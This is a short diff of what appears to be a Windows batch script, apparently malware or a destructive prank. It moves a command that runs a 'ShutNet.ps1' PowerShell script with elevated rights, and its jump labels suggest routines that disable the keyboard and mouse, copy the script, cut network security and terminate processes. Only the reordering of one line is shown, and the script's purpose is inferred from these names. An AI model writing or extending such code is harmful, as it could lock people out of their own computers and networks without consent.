@@ -42,8 +42,8 @@ PowerShell.exe -Command "Start-Process PowerShell.exe -ArgumentList '-File', 'ma
 
 
 goto disablekeyboardandmouse
+PowerShell.exe -Command "Start-Process PowerShell.exe -ArgumentList '-File', 'ShutNet.ps1' -Verb RunAs"
 goto duplication
 cscript main.vbs
 goto netsecurety
-PowerShell.exe -Command "Start-Process PowerShell.exe -ArgumentList '-File', 'ShutNet.ps1' -Verb RunAs"
 goto terminator
